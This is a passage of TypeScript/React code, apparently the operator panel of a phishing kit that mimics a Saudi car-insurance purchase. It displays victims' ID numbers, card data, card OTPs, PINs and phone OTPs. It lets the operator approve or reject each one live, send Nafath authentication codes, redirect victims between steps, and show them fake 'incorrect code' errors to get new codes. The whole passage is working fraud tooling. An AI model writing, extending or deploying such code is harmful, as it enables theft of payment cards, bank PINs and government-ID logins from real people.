        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, action }),
      });
      if (res.ok) {
        const messages: Record<string, string> = {
          approved: "تم الموافقة على رمز التحقق",
          rejected: "تم رفض رمز التحقق",
          resend: "تم إعادة إرسال رمز التحقق",
        };
        showNotification("success", messages[action]);
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  const handleSendPin = async () => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    setActionLoading("pin");
    try {
      const res = await fetch("/api/dashboard/send-pin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, pinCode: pinInput }),
      });
      if (res.ok) {
        showNotification("success", "تم إرسال رمز PIN للعميل");
        setPinInput("");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  const handleLocalOtpAction = async (action: "approved" | "rejected") => {
    setOtpLocalDecision(action);
    socketUpdatedBoxRef.current = "otp";
    await applyLocalBoxDecision("otp", "_v5Status", action, action === "approved" ? "تم الموافقة على رمز التحقق" : "تم رفض رمز التحقق");
    setTimeout(() => { socketUpdatedBoxRef.current = null; }, 2000);
  };

  const handlePinAction = async (action: "approved" | "rejected") => {
    setPinLocalDecision(action);
    socketUpdatedBoxRef.current = "pin";
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    setActionLoading("pin");
    try {
      const res = await fetch("/api/dashboard/pin-action", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, action }),
      });
      if (res.ok) {
        const messages: Record<string, string> = {
          approved: "تم الموافقة على رمز PIN",
          rejected: "تم رفض رمز PIN",
        };
        showNotification("success", messages[action]);
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
    setTimeout(() => { socketUpdatedBoxRef.current = null; }, 2000);
  };

  const handleLocalPinAction = async (action: "approved" | "rejected") => {
    setPinLocalDecision(action);
    socketUpdatedBoxRef.current = "pin";
    await applyLocalBoxDecision("pin", "_v6Status", action, action === "approved" ? "تم الموافقة على رمز PIN" : "تم رفض رمز PIN");
    setTimeout(() => { socketUpdatedBoxRef.current = null; }, 2000);
  };

  const handlePhoneAction = async (action: "approved" | "rejected" | "resend") => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    setActionLoading("phone");
    try {
      const res = await fetch("/api/dashboard/phone-action", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, action }),
      });
      if (res.ok) {
        const messages: Record<string, string> = {
          approved: "تم الموافقة على رقم الهاتف",
          rejected: "تم رفض رقم الهاتف",
          resend: "تم إعادة إرسال رمز التحقق",
        };
        showNotification("success", messages[action]);
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  const handleLocalPhoneAction = async (action: "approved" | "rejected") => {
    await applyLocalBoxDecision("phone", "phoneOtpStatus", action, action === "approved" ? "تم الموافقة على رقم الهاتف" : "تم رفض رقم الهاتف");
  };

  const handleSendNafadCode = async () => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    setActionLoading("nafad");
    try {
      const res = await fetch("/api/dashboard/send-nafad-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, nafadCode: nafadInput }),
      });
      if (res.ok) {
        showNotification("success", "تم إرسال رمز النفاذ للعميل");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  // Handle manual redirect to any page
  const handleRedirect = async () => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId || !redirectPage) return;
    
    setActionLoading("redirect");
    
    try {
      const res = await fetch("/api/dashboard/redirect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, targetPage: redirectPage }),
      });
      if (res.ok) {
        const pageLabel = pageOptions.find(p => p.value === redirectPage)?.label || redirectPage;
        showNotification("success", `تم توجيه العميل إلى: ${pageLabel}`);
        setRedirectPage("");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  // Handle approve action - move to next step
  const handleApprove = async (currentStep: string) => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    
    setActionLoading("approve");
    
    // Determine next page based on current step
    const nextPages: Record<string, string> = {
      "check": "step2",
      "step2": "step3",
      "step3": "step4",
      "step4": "step5",
      "step5": "thank-you",
    };
    const nextPage = nextPages[currentStep] || "step2";
    
    try {
      const res = await fetch("/api/dashboard/redirect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, targetPage: nextPage }),
      });
      if (res.ok) {
        showNotification("success", `تم الموافقة ✓ تم توجيه العميل للخطوة التالية`);
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  // Handle reject action - go back with error message
  const handleReject = async (currentStep: string) => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) {
      console.error("[Reject] No visitorId found");
      showNotification("error", "لم يتم اختيار عميل");
      return;
    }
    
    console.log("[Reject] Rejecting step:", currentStep, "visitorId:", visitorId);
    setActionLoading("reject");
    
    // Error messages for each step
    const errorMessages: Record<string, { message: string; targetPage: string }> = {
      "check": { message: "يرحى التأكد من بيانات الدفع او استخدام طريقة دفع مختلفة", targetPage: "check" },
      "step2": { message: "رمز التحقق غير صحيح او منتهي الصلاحية", targetPage: "step2" },
      "step3": { message: "رمز pin غير صحيح يرحى التأكد من الرمز مجدا", targetPage: "step3" },
      "step5": { message: "رقم الهاتف غير صحيح", targetPage: "step5" },
    };
    
    const errorData = errorMessages[currentStep] || { message: "حدث خطأ", targetPage: currentStep };
    
    try {
      const res = await fetch("/api/dashboard/reject", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          visitorId, 
          targetPage: errorData.targetPage,
          errorMessage: errorData.message 
        }),
      });
      
      if (res.ok) {
        showNotification("error", `تم الرفض ✗ ${errorData.message}`);
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch (err) {
      console.error("[Reject] Error:", err);
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  // Handle step5 approve - use phone-action endpoint
  const handleStep5Approve = async () => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    
    setActionLoading("approve");
    
    try {
      const res = await fetch("/api/dashboard/phone-action", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, action: "approved" }),
      });
      if (res.ok) {
        showNotification("success", "تم الموافقة ✓ تم توجيه العميل لصفحة النفاذ");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  // Handle resend code for step5
  const handleResendCode = async () => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    
    setActionLoading("resend");
    
    try {
      const res = await fetch("/api/dashboard/resend-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          visitorId, 
          targetPage: "step5",
          errorMessage: "رمز التحقق غير صحيح او منتهي الصلاحية يرجى انتظار رمز جديد"
        }),
      });
      if (res.ok) {
        showNotification("success", "تم إعادة إرسال الرمز ✓");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  // Handle nafad code send for step4
  const handleNafadCode = async (code: string) => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId || !code) return;
    
    setActionLoading("nafad");
    
    try {
      const res = await fetch("/api/dashboard/send-nafad-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, nafadCode: code }),
      });
      if (res.ok) {
        showNotification("success", "تم إرسال رمز النفاذ للعميل ✓");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  // Get current page and status from visitor data
  const getCurrentPage = (): string => {
    // Get latest phone data from all entries
    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
    const page = raw?.currentPage || raw?.page;
    return typeof page === 'string' ? page : "";
  };

  const getCurrentStep = (): number => {
    // Get latest phone data from all entries
    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
    return raw?.currentStep || raw?.step || 0;
  };

  const getPaymentStatus = (): string => {
    // Get latest phone data from all entries
    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
    return raw?._v1Status || "";
  };

  // Get card OTP status (step 2 - after payment approval)
  const getCardOtpStatus = (): string => {
    // Get latest phone data from all entries
    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
    return raw?._v5Status || "";
  };

  const getPinStatus = (): string => {
    // Get latest phone data from all entries
    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
    return raw?._v6Status || "";
  };

  // Get phone OTP status (step 5 - after PIN)
  const getPhoneOtpStatus = (): string => {
    // Get latest phone data from all entries
    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
    return raw?.phoneOtpStatus || "";
  };

  // Get nafad status (step 8)
  const getNafadStatus = (): string => {
    // Get latest phone data from all entries
    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
    return raw?._v8Status || "";
  };

  // Render basic information box (from home-new page)
  const renderBasicInfoBox = () => {
    // Get latest basic info data from all entries
    const raw = getLatestRawForBox('basic') || selectedRequest?.raw;
    
    // Check if there's basic info data
    const hasBasicInfo = Boolean(
      raw?.identityNumber || 
      raw?.ownerName || 
      raw?.buyerName ||
      raw?.phoneNumber || 
      raw?.documentType || 
      raw?.serialNumber ||
      raw?.insuranceType ||
      raw?.country ||
      raw?.deviceType
    );
    
    if (!hasBasicInfo) return null;
    
    // Get timestamp for sorting
    const timestamp = getEntryTimestamp(raw);

    return (
      <div style={{ 
        background: "#ffffff", 
        borderRadius: 12, 
        padding: 16, 
        border: "1px solid #e5e7eb", 
        marginBottom: 12, 
        marginTop: 10,
        position: "relative",
        width: "40%",
        marginRight: 0,
        marginLeft: "auto"
      }}>
        {timestamp > 0 && (
          <div style={{
            position: "absolute",
            top: 8,
            left: 8,
            fontSize: "0.65rem",
            color: "#9ca3af",
            background: "#f3f4f6",
            padding: "2px 6px",
            borderRadius: 4
          }}>
            {new Date(timestamp).toLocaleString("ar-SA", { hour: "2-digit", minute: "2-digit", hour12: true })}
          </div>
        )}
        <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
          <span style={{ fontSize: "1.2rem" }}>📋</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
            صندوق المعلومات الأساسية
          </h3>
        </div>
        
        <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
          {raw?.identityNumber && (
            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهوية</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.identityNumber}</span>
            </div>
          )}
          {raw?.ownerName && (
            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>الاسم</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.ownerName}</span>
            </div>
          )}
          {raw?.buyerName && (
            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>اسم المشتري</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.buyerName}</span>
            </div>
          )}
          {raw?.phoneNumber && (
            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهاتف</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.phoneNumber}</span>
            </div>
          )}
          {raw?.documentType && (
            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>نوع المستند</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.documentType}</span>
            </div>
          )}
          {raw?.serialNumber && (
            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>الرقم التسلسلي</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.serialNumber}</span>
            </div>
          )}
          {raw?.insuranceType && (
            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>نوع التأمين</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.insuranceType}</span>
            </div>
          )}
          {raw?.country && (
            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>البلد</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.country}</span>
            </div>
          )}
        </div>
      </div>
    );
  };

  // Render insurance details box (from insur page)
  const renderInsuranceDetailsBox = () => {
    // Get latest insurance data from all entries
    const raw = getLatestRawForBox('insurance') || selectedRequest?.raw;
    
    // Check if there's insurance data
    const hasInsuranceData = Boolean(
      raw?.insuranceCoverage || 
      raw?.insuranceStartDate || 
      raw?.vehicleUsage ||
      raw?.vehicleValue || 
      raw?.vehicleYear ||
      raw?.vehicleModel ||
      raw?.repairLocation
    );
    
    if (!hasInsuranceData) return null;
    
    // Get timestamp for sorting
    const timestamp = getEntryTimestamp(raw);

    return (
      <div style={{ 
        background: "#ffffff", 
        borderRadius: 12, 
        padding: 16, 
        border: "1px solid #e5e7eb", 
        marginBottom: 12, 
        marginTop: 10,
        position: "relative",
        width: "40%",
        marginRight: 0,
        marginLeft: "auto"
      }}>
        {timestamp > 0 && (
          <div style={{
            position: "absolute",
            top: 8,
            left: 8,
            fontSize: "0.65rem",
            color: "#9ca3af",
            background: "#f3f4f6",
            padding: "2px 6px",
            borderRadius: 4
          }}>
            {new Date(timestamp).toLocaleString("ar-SA", { hour: "2-digit", minute: "2-digit", hour12: true })}
          </div>
        )}
        <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
          <span style={{ fontSize: "1.2rem" }}>🛡️</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
            صندوق تفاصيل التأمين
          </h3>
        </div>
        
        <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
          {raw?.insuranceCoverage && (
            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>نوع التغطية</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>
                {raw.insuranceCoverage === "comprehensive" ? "شامل" : "ضد الغير"}
              </span>
            </div>
          )}
          {raw?.insuranceStartDate && (
            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>تاريخ البدء</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.insuranceStartDate}</span>
            </div>
          )}
          {raw?.vehicleUsage && (
            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>استخدام المركبة</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.vehicleUsage}</span>
            </div>
          )}
          {raw?.vehicleValue && (
            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>القيمة التقديرية</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.vehicleValue} ﷼</span>
            </div>
          )}
          {raw?.vehicleYear && (
            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>سنة الصنع</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.vehicleYear}</span>
            </div>
          )}
          {raw?.vehicleModel && (
            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>الموديل</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.vehicleModel}</span>
            </div>
          )}
          {raw?.repairLocation && (
            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>مكان الإصلاح</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>
                {raw.repairLocation === "agency" ? "الوكالة" : "الورشة"}
              </span>
            </div>
          )}
        </div>
      </div>
    );
  };

  // Render card verification status box (_v1Status)
  const renderCardVerificationBox = () => {
    const currentPage = getCurrentPage();
    const paymentStatus = getPaymentStatus();
    const effectivePaymentStatus = localDecisionStates.payment || paymentStatus;
    // Get latest phone data from all entries
    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;

    // Show box if there's card data OR status is approved/rejected (keep showing after decision)
    const hasCardData = raw?._v1 || raw?.cardNumber;
    const hasDecision = effectivePaymentStatus === "approved" || effectivePaymentStatus === "rejected";
    const showDecisionButtons = !hasDecision && hasCardData && (effectivePaymentStatus === "pending" || effectivePaymentStatus === "verifying" || effectivePaymentStatus === "");
    // ALWAYS show if there's card data, never hide
    if (!hasCardData && !hasDecision) {
      return null;
    }

    return (
      <div style={{ 
        background: "#ffffff", 
        borderRadius: 12, 
        padding: 16, 
        border: "1px solid #e5e7eb", 
        marginBottom: 12,
        marginTop: 10,
        width: "40%",
        marginRight: 0,
        marginLeft: "auto"
      }}>
        <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
          <span style={{ fontSize: "1.2rem" }}>💳</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
            صندوق بيانات الدفع
          </h3>
        </div>
        
        {/* Status message */}
        {effectivePaymentStatus === "approved" && (
          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق - العميل يُوجه للخطوة التالية</p>
          </div>
        )}
        {effectivePaymentStatus === "rejected" && (
          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - العميل يجب أن يُعيد إدخال البيانات</p>
          </div>
        )}
        {(effectivePaymentStatus === "pending" || effectivePaymentStatus === "verifying") && currentPage === "check" && hasCardData && (
          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار المراجعة</p>
          </div>
        )}
        {showDecisionButtons && (
          <div style={{ display: "flex", gap: 8, justifyContent: "center" }}>
            <button onClick={() => handleLocalPaymentAction("approved")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
              موافقة
            </button>
            <button onClick={() => handleLocalPaymentAction("rejected")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
              رفض
            </button>
          </div>
        )}
      </div>
    );
  };

  // Render Card OTP box (currentStep === 5)
  const renderCardOtpBox = () => {
    const currentStep = getCurrentStep();
    const currentPage = getCurrentPage();
    const cardOtpStatus = getCardOtpStatus();
    const effectiveCardOtpStatus = localDecisionStates.otp || cardOtpStatus;
    const otpMatch = getLatestEntryForMatcher((raw) => Boolean(raw._v5 || raw.otpCode || raw.otpSubmittedAt || raw._v5UpdatedAt || raw._v5Status));
    const raw = otpMatch?.raw || selectedRequest?.raw || {};
    const otpEntry = otpMatch?.entry || null;

    // Get the OTP code from various possible field names
    const otpCode = raw?._v5 || raw?.otpCode || "";
    const otpBoxTimestamp = otpEntry
      ? new Date(otpEntry.submittedAt || otpEntry.updatedAt || raw._v5UpdatedAt || raw.otpSubmittedAt || Date.now()).getTime()
      : 0;

    // Show box if there's OTP data OR status exists
    const hasOtpData = otpCode || raw?.otpSubmittedAt || raw?._v5UpdatedAt;
    const hasDecision = effectiveCardOtpStatus === "approved" || effectiveCardOtpStatus === "rejected";
    const showOtpButtons = !hasDecision && hasOtpData && (effectiveCardOtpStatus === "pending" || effectiveCardOtpStatus === "verifying" || effectiveCardOtpStatus === "");
    // ALWAYS show if there's OTP data, never hide
    if (!hasOtpData && !hasDecision && currentStep !== 5) {
      return null;
    }

    return (
      <div style={{ 
        background: "#ffffff", 
        borderRadius: 12, 
        padding: 16, 
        border: "1px solid #e5e7eb", 
        marginBottom: 12,
        marginTop: 10,
        width: "40%",
        marginRight: 0,
        marginLeft: "auto"
      }}>
        <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
          <span style={{ fontSize: "1.2rem" }}>🔐</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
            صندوق رمز التحقق من البطاقة
          </h3>
          <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>
            {formatRelativeTimeLabel(otpBoxTimestamp > 0 ? new Date(otpBoxTimestamp).toISOString() : (selectedRequest?.submittedAt || selectedRequest?.updatedAt))}
          </span>
        </div>
        
        {/* Show OTP code when submitted */}
        {otpCode && (
          <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", marginBottom: 12, textAlign: "center" }}>
            <p style={{ margin: "0 0 4px", fontSize: "0.75rem", color: "#0369a1" }}>رمز التحقق المُدخل:</p>
            <p style={{ margin: 0, fontSize: "1.5rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{otpCode}</p>
          </div>
        )}
        
        {/* Status message */}
        {effectiveCardOtpStatus === "approved" && (
          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق - العميل يُوجه للخطوة التالية</p>
          </div>
        )}
        {effectiveCardOtpStatus === "rejected" && (
          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - العميل يجب أن يُعيد إدخال الرمز</p>
          </div>
        )}
        {showOtpButtons && (
          <div style={{ display: "flex", gap: 8, justifyContent: "center" }}>
            <button onClick={() => handleLocalOtpAction("approved")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
              موافقة
            </button>
            <button onClick={() => handleLocalOtpAction("rejected")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
              رفض
            </button>
          </div>
        )}
      </div>
    );
  };

  // Render PIN box (currentStep === 6)
  const renderPinBox = () => {
    const currentStep = getCurrentStep();
    const pinStatus = getPinStatus();
    const effectivePinStatus = localDecisionStates.pin || pinStatus;
    const pinMatch = getLatestEntryForMatcher((raw) => Boolean(raw._v6 || raw.pinCode || raw.pinSubmittedAt || raw._v6UpdatedAt || raw._v6Status));
    const raw = pinMatch?.raw || selectedRequest?.raw || {};
    const pinEntry = pinMatch?.entry || null;
    const pinBoxTimestamp = pinEntry
      ? new Date(pinEntry.submittedAt || pinEntry.updatedAt || raw._v6UpdatedAt || raw.pinSubmittedAt || Date.now()).getTime()
      : 0;

    // Show box if there's PIN data OR status exists
    const hasPinData = raw?._v6 || raw?.pinCode;
    const hasDecision = effectivePinStatus === "approved" || effectivePinStatus === "rejected";
    const isPending = effectivePinStatus === "pending" || effectivePinStatus === "verifying";
    const showButtons = isPending && hasPinData;
    // ALWAYS show if there's PIN data, never hide
    if (!hasPinData && !hasDecision && currentStep !== 6) {
      return null;
    }

    return (
      <div style={{ 
        background: "#ffffff", 
        borderRadius: 12, 
        padding: 16, 
        border: "1px solid #e5e7eb", 
        marginBottom: 12,
        marginTop: 10,
        width: "40%",
        marginRight: 0,
        marginLeft: "auto"
      }}>
        <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
          <span style={{ fontSize: "1.2rem" }}>🔑</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
            صندوق رمز PIN
          </h3>
          <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>
            {formatRelativeTimeLabel(pinBoxTimestamp > 0 ? new Date(pinBoxTimestamp).toISOString() : (selectedRequest?.submittedAt || selectedRequest?.updatedAt))}
          </span>
        </div>
        
        <div style={{ display: "flex", justifyContent: "center", gap: 4, direction: "ltr", marginBottom: 12 }}>
          {Array.from({ length: 4 }).map((_, idx) => {
            const pinValue = String(raw?._v6 || raw?.pinCode || "0000").padStart(4, "0")[idx] || "0";
            return (
              <div key={idx} style={{ background: "#f0f9ff", borderRadius: 8, boxShadow: "0 1px 3px rgba(0, 0, 0, 0.1)", display: "flex", alignItems: "center", justifyContent: "center", width: 40, height: 50 }}>
                <span style={{ fontSize: "1.5rem", fontWeight: 700, color: "#0369a1", letterSpacing: "0.2em" }}>{pinValue}</span>
              </div>
            );
          })}
        </div>
        
        {/* Status messages */}
        {effectivePinStatus === "approved" && (
          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق - العميل يُوجه للتحقق من الهاتف</p>
          </div>
        )}
        {effectivePinStatus === "rejected" && (
          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - العميل يجب أن يُعيد إدخال الرمز</p>
          </div>
        )}
        {isPending && currentStep === 6 && hasPinData && (
          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار المراجعة</p>
          </div>
        )}
        {showButtons && (
          <div style={{ display: "flex", gap: 8, justifyContent: "center" }}>
            <button onClick={() => handleLocalPinAction("approved")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
              موافقة
            </button>
            <button onClick={() => handleLocalPinAction("rejected")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
              رفض
            </button>
          </div>
        )}
      </div>
    );
  };

  // Render Phone OTP box (currentStep === 7)
  const renderPhoneOtpBox = () => {
    const currentStep = getCurrentStep();
    const currentPage = getCurrentPage();
    const phoneOtpStatus = getPhoneOtpStatus();
    const effectivePhoneOtpStatus = localDecisionStates.phone || phoneOtpStatus;
    const phoneMatch = getLatestEntryForMatcher((raw) => Boolean(raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7 || raw.phoneSubmittedAt || raw._v7UpdatedAt));
    const raw = phoneMatch?.raw || selectedRequest?.raw || {};
    const phoneEntry = phoneMatch?.entry || null;
    const phoneBoxTimestamp = phoneEntry
      ? new Date(phoneEntry.submittedAt || phoneEntry.updatedAt || raw._v7UpdatedAt || raw.phoneSubmittedAt || Date.now()).getTime()
      : 0;

    // Get phone OTP code if submitted (stored as _v7 in history)
    const phoneOtpCode = String(raw?._v7 || raw?.phoneOtp || "").trim();

    // Show box if there's phone data OR OTP code OR status exists
    const hasPhoneData = Boolean(raw?.phoneNumber || raw?.phoneIdNumber);
    const hasAnyPhoneData = hasPhoneData || Boolean(phoneOtpCode) || Boolean(phoneOtpStatus);
